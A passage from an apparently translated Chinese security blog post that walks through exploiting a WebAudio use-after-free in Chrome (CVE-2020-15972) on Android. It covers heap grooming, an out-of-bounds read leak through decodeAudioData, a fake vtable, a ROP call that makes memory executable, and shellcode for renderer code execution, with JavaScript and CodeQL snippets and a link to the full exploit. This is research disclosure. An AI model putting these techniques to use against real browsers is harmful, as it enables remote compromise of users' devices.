<p>然而，有几个问题。首先，即使可以替换掉已释放的AudioNodeOutput，我仍然需要有一个有效的指向connection_bus的指针，这个指针是一个有效的AudioBus。一个简单的方法是用另一个有短总线的AudioNodeOutput替换AudioNodeOutput。不幸的是，所有AudioNodeOutput的Bus都是相同的长度（128），这是有道理的，否则会一直有越界的读写。另一种可能性是，由于Bus为AudioNodeOutput所有，可以直接替换Bus，而让AudioNodeOutput空出来。由于用于分配AudioNodeOutput和Bus的内存分配器PartitionAlloc是一个桶分配器，AudioNodeOutput的大小为104，而AudioBus的大小为32，通过分别操作这两个桶，可以在释放AudioNodeOutput的同时替换Bus。虽然PartitionAlloc会把释放对象的前8个字节弄乱作为额外的保护，但这并不影响AudioNodeOutput::Bus返回的指针，所以connection_bus仍然会指向用来替换的对象。如果用一个长度较短的对象替换Bus，那么就会得到一个信息泄露。</p>
<p>现在的问题是如何创建一个具有任意长度的AudioBus。看看对AudioBus::Create的各种调用，ConvolverHandler::SetBuffer中的调用看起来很有希望，因为它可以通过指定ConvolverNode的buffer字段从javascript中轻松到达。不幸的是，创建的AudioBus只是本地的，并且在函数调用结束后会被删除，这使得它很难使用。最后，WebAudioBus::Initialize中的那个函数效果更好，因为它可以通过javascript中的decodeAudioData函数达到，创建的AudioBus的长度由输入ArrayBuffer（包含一些音频数据）的大小控制。通过使用ffmpeg来创建不同长度的MP3文件，我能够使用这个函数来创建不同长度的AudioBus。</p>
<p>下一个问题更难解决。虽然可以造成越界读取，并将结果复制到summing_bus的backing store中，但由于几个原因，没有办法将这些数据读出来：</p>
<ul>
<li>为了触发UAF，需要删除包含音频图的iframe，这意味着当越界读取发生时，所有的音频节点将无法到达，因此没有办法检索属于该图的AudioNodeInput的summing_bus中的数据。</li>
<li>如果summing_bus也被释放，那么也许可以用仍然可以到达的AudioNodeInput中的另一个AudioBus来代替它，然后也许有办法从该AudioNodeInput的summing_bus中读出数据。不幸的是，情况也不是这样的，因为summing_bus不是一个原始指针，而是一个共享所有权的scoped_refptr。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioNodeInput::SumAllConnections</span><span class="params">(scoped_refptr&lt;AudioBus&gt; summing_bus,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       <span class="type">uint32_t</span> frames_to_process)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; <span class="built_in">NumberOfRenderingConnections</span>(); ++i) &#123;</span><br><span class="line">    ...</span><br><span class="line">    summing_bus-&gt;<span class="built_in">SumFrom</span>(*connection_bus, interpretation);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这意味着，即使现在所有的东西都被释放了，summing_bus仍将保持活力，至少在SumAllConnections调用完成之前，所以没有办法去替换summing_bus。</p>
<p><strong>实际的方式</strong></p>
<p>回到上一节第1点中的迭代器无效原语。如前所述，通过把一个接受多个输入的AudioNode，如ChannelMergerNode放在AudioWorkletNode之后，然后删除包含音频图的iframe来触发UAF，ChannelMergerNode和由此产生的inputs_将被删除，而AudioHandler::PullInputs的循环仍在迭代中：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioHandler::PullInputs</span><span class="params">(<span class="type">uint32_t</span> frames_to_process)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; input : inputs_)</span><br><span class="line">    input-&gt;<span class="built_in">Pull</span>(<span class="literal">nullptr</span>, frames_to_process);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在实践中，这意味着在完成input-&gt;Pull调用后，input迭代器将被递增，并指向现在被删除的<code>input_</code>的已释放backing store中的下一个位置。这将继续下去，直到达到<code>input_</code>的长度。因此，通过分配另一个与inputs_相同大小的Vector，我用新Vector的支持存储空间替换了已释放的backing store。虽然这可以用来造成类型混乱，并在许多不同类型的对象上调用AudioNodeInput::Pull，但应该用什么对象来替换AudioNodeInput并不明显。</p>
<p>将ChannelMergerNode换成另一个ChannelMergerNode，它运行在父帧的音频图上。因此，当这个错误触发时，它将继续运行另一个运行在父帧中的音频图。</p>
<p>下面的图展示了替换这个对象时会发生什么：</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/replace_graph.png"></p>
<p>破折号边框和边表示如果子iframe没有被删除，将会被运行的节点和边，而绿色节点表示实际被运行的节点。在处理完子iframe的顶部分支后，该框架被删除，ChannelMergerNode被替换成父帧中的节点。这导致父帧中的音频图的底部分支被代替运行。</p>
<p>当删除一个AudioNode时会发生什么？正如前面解释的那样，当一个AudioNode被垃圾回收时，为了防止底层的AudioHandler被删除，而它还在被用来处理音频图，AudioNode将通过调用AudioContext的IsPullingAudioGraph方法来检查它所属的音频图是否正在被处理：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AudioNode::Dispose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">context</span>()-&gt;<span class="built_in">IsPullingAudioGraph</span>()) &#123;</span><br><span class="line">    <span class="built_in">context</span>()-&gt;<span class="built_in">GetDeferredTaskHandler</span>().<span class="built_in">AddRenderingOrphanHandler</span>(</span><br><span class="line">        std::<span class="built_in">move</span>(handler_));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>IsPullingAudioGraph检查音频图是否处于kRunning状态：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">OfflineAudioContext::IsPullingAudioGraph</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ContextState</span>() == BaseAudioContext::kRunning;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并转移AudioHandler的所有权（如果它是）。然而，在这种情况下，因为父帧中的音频图正在作为子框架中的图的一部分被处理，音频图不会处于kRunning状态，因为它没有从父帧中启动。(在实际利用中，将不得不启动然后暂停图形以使节点相互连接，但这没有什么区别，因为图形将处于kSuspended状态，所以IsPullingAudioGraph检查仍将通过)这意味着AudioHandler的所有权转移将不会发生，它将在图形被处理时被删除。</p>
<p>这意味着可以在这个图中引起同样类型的UAF，而不需要删除包含它的框架。这一点很重要，因为之前试图获得信息泄露的主要问题是，所有的节点和包含它们的iframe都被删除了，所以没有办法检索到泄露的数据。但现在可以在不删除包含节点的框架的情况下导致UAF，将能够在UAF触发后访问它们，并能够读取泄露的数据。</p>
<h3 id="获取信息泄露"><a href="#获取信息泄露" class="headerlink" title="获取信息泄露"></a>获取信息泄露</h3><p>第一步，在一个子iframe中触发UAF，并使用循环迭代器无效原语，使音频图的一个分支在父帧中运行。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/replace_graph2.png"></p>
<p>上图显示了将用于替换的实际图形。它由两个ScriptProcessorNode夹着一个GainNode组成。ScriptProcessorNode就像AudioWorkletNode，它允许运行用户提供的脚本来处理音频数据。然而，在ScriptProcessorNode的情况下，脚本是在dom窗口的上下文中运行的，它允许我访问AudioContext和各种节点，这使得使用ScriptProcessorNode进行开发更容易，exp将在父框架图中使用它而不是AudioWorkletNode。</p>
<p>第二步，在ScriptProcessorNode脚本2的音频处理脚本中，移除跟随它的GainNode，并对其进行垃圾回收，这样它的AudioInputNode和AudioOutputNode，就被释放了。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/replace_graph3.png"></p>
<p>为了构建信息泄露，还需要替换被删除的GainNode，以防止虚函数调用崩溃，同时让它的AudioOutputNode保持自由。可以通过操纵堆来创建额外的释放的AudioOutputNode，这样当GainNode被释放时，它的AudioOutputNode就不会在free列表的首位，不会被替换。我通过创建一个额外的ChannelMergerNode来做到这一点。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">createSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  let s = audioCtx.<span class="built_in">createChannelMerger</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第一个ScriptProcessorNode的音频处理器。</span></span><br><span class="line"><span class="function">function <span class="title">scriptProcess2</span><span class="params">(audioProcessingEvent)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 需要为AudioOutputNode创建孔，使它们不会被回收。</span></span><br><span class="line">  <span class="built_in">createSource</span>();</span><br><span class="line">  ...</span><br><span class="line">  script<span class="number">2.</span><span class="built_in">disconnect</span>();  <span class="comment">//&lt;--- 移除GainNode的引用</span></span><br><span class="line">  <span class="built_in">gc</span>();                  <span class="comment">//&lt;--- 首先删除GainNode, 然后在createSource中创建ChannelMergerNode</span></span><br><span class="line">  <span class="comment">// 需要等待GC分配的小对象被清除。</span></span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">4000</span>);</span><br><span class="line">  let gain = audioCtx<span class="number">2.</span><span class="built_in">createGain</span>();  							 <span class="comment">//&lt;---- 替换gain以获取虚函数调用</span></span><br><span class="line">  let src0 = audioCtx<span class="number">2.</span><span class="built_in">createChannelMerger</span>(<span class="number">1</span>); 		   <span class="comment">//&lt;--- 为AudioBus安排堆栈</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然对createSource的调用看起来是多余的，但是，在createSource中创建的ChannelMergerNode直到垃圾回收时才会被删除，到那时，它实际上会在GainNode之后被删除，在freelist的头部留下额外的AudioOutputNode。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/heap1.png"></p>
<p>当被删除的GainNode被另一个GainNode取代时，旧GainNode的已释放的AudioNodeOutput将不会被占用。这个被释放的GainNode将负责调用Bus并为我们提供一个被释放的AudioBus。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/heap2.png"></p>
<p>在图中，绿色箭头表示当另一个对象被删除时被释放的对象，红色箭头表示被创建的对象。</p>
<p>为了替换AudioNodeOutput拥有的大小为32的AudioBus，也需要对大小为32的桶进行操作。为此再次使用另一个ChannelMergerNode。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/heap3.png"></p>
<p>同时，还必须注意不要替换被删除的GainNode的AudioNodeOutput…</p>
<p>虽然有很多要求需要满足，而且AudioBus是从一个相当嘈杂的桶中分配的，但与其他情况不同的是，在其他情况下，堆经常被其他进程共享，而这些进程并不在我们的控制范围内，而渲染器在很大程度上是一个孤立的进程，完全拥有其堆。因此，只要脚本是从一个新的渲染器中运行的，就可以以非常精确和具体的方式进行渲染器堆的喷射（当从登录的上下文中点击一个链接时，如通过电子邮件或Twitter），所以这不会对漏洞的可靠性造成太大的问题。</p>
<p>一旦堆被放入正确的状态，使现在被删除的GainNode所拥有的AudioBus处于freelist的正确位置，AudioContext::decodeAudioData函数就可以用来创建一个适当长度的AudioBus来触发越界读取。这个函数接收一个音频文件的ArrayBuffer（例如mp3、ogg），并在后台线程中对其进行解码。它将创建一个具有适当长度的AudioBus来容纳解码后的结果。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AsyncAudioDecoder::DecodeOnBackgroundThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    DOMArrayBuffer* audio_data,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span> sample_rate,</span></span></span><br><span class="line"><span class="params"><span class="function">    V8DecodeSuccessCallback* success_callback,</span></span></span><br><span class="line"><span class="params"><span class="function">    V8DecodeErrorCallback* error_callback,</span></span></span><br><span class="line"><span class="params"><span class="function">    ScriptPromiseResolver* resolver,</span></span></span><br><span class="line"><span class="params"><span class="function">    BaseAudioContext* context,</span></span></span><br><span class="line"><span class="params"><span class="function">    scoped_refptr&lt;base::SingleThreadTaskRunner&gt; task_runner)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  scoped_refptr&lt;AudioBus&gt; bus = <span class="built_in">CreateBusFromInMemoryAudioFile</span>(</span><br><span class="line">      audio_data-&gt;<span class="built_in">Data</span>(), audio_data-&gt;<span class="built_in">ByteLength</span>(), <span class="literal">false</span>, sample_rate);  <span class="comment">//&lt;----- 创建AudioBus</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (context) &#123;</span><br><span class="line">    <span class="built_in">PostCrossThreadTask</span>(</span><br><span class="line">        *task_runner, FROM_HERE,</span><br><span class="line">        <span class="built_in">CrossThreadBindOnce</span>(&amp;AsyncAudioDecoder::NotifyComplete,</span><br><span class="line">                            <span class="built_in">WrapCrossThreadPersistent</span>(audio_data),</span><br><span class="line">                            <span class="built_in">WrapCrossThreadPersistent</span>(success_callback),</span><br><span class="line">                            <span class="built_in">WrapCrossThreadPersistent</span>(error_callback),</span><br><span class="line">                            WTF::<span class="built_in">RetainedRef</span>(std::<span class="built_in">move</span>(bus)),            <span class="comment">//&lt;------ 传入NotifyComplete</span></span><br><span class="line">                            <span class="built_in">WrapCrossThreadPersistent</span>(resolver),</span><br><span class="line">                            <span class="built_in">WrapCrossThreadPersistent</span>(context)));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，创建的AudioBus被作为主线程上的一个任务传递给NotifyComplete，并在NotifyComplete完成后被删除。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AsyncAudioDecoder::NotifyComplete</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    DOMArrayBuffer*,</span></span></span><br><span class="line"><span class="params"><span class="function">    V8DecodeSuccessCallback* success_callback,</span></span></span><br><span class="line"><span class="params"><span class="function">    V8DecodeErrorCallback* error_callback,</span></span></span><br><span class="line"><span class="params"><span class="function">    AudioBus* audio_bus,</span></span></span><br><span class="line"><span class="params"><span class="function">    ScriptPromiseResolver* resolver,</span></span></span><br><span class="line"><span class="params"><span class="function">    BaseAudioContext* context)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  AudioBuffer* audio_buffer = AudioBuffer::<span class="built_in">CreateFromAudioBus</span>(audio_bus);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If the context is available, let the context finish the notification.</span></span><br><span class="line">  <span class="keyword">if</span> (context) &#123;</span><br><span class="line">    context-&gt;<span class="built_in">HandleDecodeAudioData</span>(audio_buffer, resolver, success_callback,</span><br><span class="line">                                   error_callback);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于AudioBus在这里只是一个临时对象，在解码完成后会被删除，所以需要确保它的寿命足够长，以便发生越界读取。为了做到这一点，可以使用javascript函数setInterval来干扰任务队列。当调用setInterval时，它会创建一个延迟的任务。这个任务以及DecodeOnBackgroundThread发布的NotifyComplete任务被发布到同一个任务队列中，在主线程上执行。通过用setInterval创建任务，我可以使NotifyComplete的运行出现延迟，因为在NotifyComplete之前发布的任何任务都必须在NotifyComplete之前运行，而且它们都必须在主线程上运行。这将允许在足够长的时间内保持AudioBus的活力，这样当AudioNodeInput::SumAllConnections导致越界读取时，在音频线程中使用这个AudioBus，它将仍然活着。</p>
<p>通过使用ffmpeg来创建一个无声的mp3文件，创建一个最小长度为47的AudioBus。由于来自AudioNodeInput的AudioBus的长度是128，而且AudioBus的后备存储是浮点格式，有16个大小的padding（Android为16，x86为32），这意味着可以使用界外读原语来读取大小在204和528之间的对象。CodeQL查询，可以用来识别这样的对象，并选择适当的文件长度来使用。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FastMallocClass</span> extends Class &#123;</span><br><span class="line">    <span class="built_in">FastMallocClass</span>() &#123;</span><br><span class="line">        <span class="built_in">exists</span>(Operator op, Function fastMalloc | op.<span class="built_in">hasName</span>(<span class="string">&quot;operator new&quot;</span>) <span class="keyword">and</span></span><br><span class="line">          fastMalloc.<span class="built_in">hasName</span>(<span class="string">&quot;FastMalloc&quot;</span>) <span class="keyword">and</span> op.<span class="built_in">calls</span>(fastMalloc) <span class="keyword">and</span></span><br><span class="line">          op.<span class="built_in">getDeclaringType</span>() = <span class="keyword">this</span>.getABaseClass*()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from FastMallocClass c</span><br><span class="line">where c.<span class="built_in">getSize</span>() &lt;= <span class="number">528</span> <span class="keyword">and</span> c.<span class="built_in">getSize</span>() &gt; <span class="number">204</span></span><br><span class="line">select c, c.<span class="built_in">getLocation</span>(), c.<span class="built_in">getSize</span>()</span><br></pre></td></tr></table></figure>

<p>在这里做了改进，只包括在FastMalloc分区中分配的对象，也就是分配AudioBus的备份存储（AudioArray）的地方。看了一下结果，BiquadDSPKernel特别有用。除了要泄露vtable之外，它还包含一个字段biquad_，存储了5个AudioDoubleArray。这意味着通过泄露BiquadDSPKernel类型的对象，就能同时泄露这些AudioDoubleArray的后备存储地址，然后可以用来存储一个假的vtable来劫持虚拟函数调用。</p>
<p>因此，通过安排堆，把BiquadDSPKernel放在AudioBus后面，然后触发bug导致越界读取，就能把BiquadDSPKernel对象泄漏到下一个AudioNodeInput的AudioBus中。为了读取输入数据，可以使用ScriptProcessorNode，它允许使用javascript函数来读取输入。然后，可以获得泄漏的vtable和各种AudioDoubleArray的地址。</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>在这一点上，其余的利用方法是相当标准的。一旦获得了BiquadDSPKernel的vtable的地址，就可以用它来找到libchrome.so的偏移。有了libchrome.so的偏移量，就可以找到里面的ROP小工具的地址，并在属于BiquadDSPKernel的AudioDoubleArray中创建一个假的vtable，这样，这个假vtable中的虚拟函数指针就会指向所选择的小工具。</p>
<p>之后，自由使用后的漏洞就可以再一次被触发了。这一次，它直接进入漏洞的第二节Primitives中的路径，调用一个虚拟函数。被释放的AudioHandler对象现在可以被一个适当大小的AudioArray所取代，这个AudioArray被填充了受控数据，这样它的vtable就指向了在上面创建的假vtable。</p>
<p><img src="https://securitylab.github.com/assets/img/post-images/webaudio/call_func.png"></p>
<p>使用类似于<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf/">这篇文章</a>中使用的小工具，调用OS::SetPermissions，将BiquadDSPKernel中的AudioDoubleArray的页面权限覆盖为rwx。一旦完成，就可以在这些AudioDoubleArray中放置shell代码，并再次触发这个bug来运行任意代码。在实际的漏洞中，一个延迟节点被用作免费的AudioHandler，IIRFilterNode的前馈系数被用来伪造DelayHandler。</p>
<p>完整的exp在<a target="_blank" rel="noopener" href="https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/blink/CVE-2020-15972">这里</a>。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在这篇文章中，我们再次看到，复杂的对象清理，加上多线程的微妙性，导致了WebAudio中的漏洞可以作为渲染器RCE来利用。虽然与v8中的漏洞相比，blink中的漏洞一般需要更多的时间来利用，但它仍然是Chrome中获得（沙盒）RCE的一个巨大而可行的攻击面。</p>
<p>就整个系列而言，我们还看到了沙盒架构，加上Chrome浏览器中漏洞的快速修复，确实有助于使其难以获得完整的链（并确保完整的链即使进入野外也不会持续太久）。本系列中使用的渲染器漏洞从首次报告到修复大约需要六周时间，而沙盒逃逸也需要类似的时间来修复，这对Chrome来说是相当标准的。这大大降低了渲染器漏洞与沙盒逃逸重叠的可能性。正如我们在这一系列案例中看到的那样，由于这种快速修复漏洞的方式，在稳定版本的Chrome浏览器中，渲染器漏洞并没有与沙盒逃逸重叠在一起。正是修复漏洞的效率使沙箱变得更加有效。另一方面，我们也从沙盒逃逸的帖子中看到了每次启动一次的ASLR（即从Zygote分叉的进程）如何大大降低了安卓系统中应用沙盒的有效性。虽然Chrome的基本地址在渲染器和浏览器之间仍然是随机的，但许多其他库不是，我仍然能够使用这些库中的小工具，不费吹灰之力就逃出Chrome的沙箱。虽然每次启动一次的ASLR对于缓解远程攻击仍然非常有用，但正如我们在这篇文章中所看到的，编写漏洞的大部分精力都花在了击败ASLR上，它对于本地权限升级没有什么用处。由于两个主要平台（Windows和Android）都实施了每次启动一次的ASLR，这仍然是Chrome沙箱的最大弱点之一。</p>
</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://avatars.githubusercontent.com/u/19711495?v=4" alt="buffer0verflooow"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">buffer0verflooow</p><p class="is-size-6 is-block">Security Researcher</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Beijing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">56</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">51</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-10T06:23:56.000Z">2022-10-10</time></p><p class="title"><a href="/2022/10/10/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-30T07:29:09.000Z">2022-07-30</time></p><p class="title"><a href="/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">Android安全笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-20T12:35:56.000Z">2022-07-20</time></p><p class="title"><a href="/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Android中间人攻击方法整理</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-04T12:34:01.000Z">2022-07-04</time></p><p class="title"><a href="/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/">Android 11 魔形女漏洞</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-01T13:59:36.000Z">2022-07-01</time></p><p class="title"><a href="/2022/07/01/macOS-Intel%E5%9B%BE%E5%BD%A2%E5%86%85%E6%A0%B8%E6%8B%93%E5%B1%95RCE-EOP/">macOS Intel图形内核拓展RCE+EOP</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">July 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">June 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">April 2022</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">December 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">November 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ASN-1/"><span class="tag">ASN.1</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AppleAVE2/"><span class="tag">AppleAVE2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ContentProvider/"><span class="tag">ContentProvider</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/IOServices/"><span class="tag">IOServices</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/LPE/"><span class="tag">LPE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PendingIntent/"><span class="tag">PendingIntent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adobe/"><span class="tag">adobe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/afl/"><span class="tag">afl++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ams/"><span class="tag">ams</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">18</span></a></div><div class="control"><a class="tags has-addons" href="/tags/aosp/"><span class="tag">aosp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/apple/"><span class="tag">apple</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/arm64/"><span class="tag">arm64</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cfprefsd/"><span class="tag">cfprefsd</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/chrome/"><span class="tag">chrome</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/darwin/"><span class="tag">darwin</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/exploit/"><span 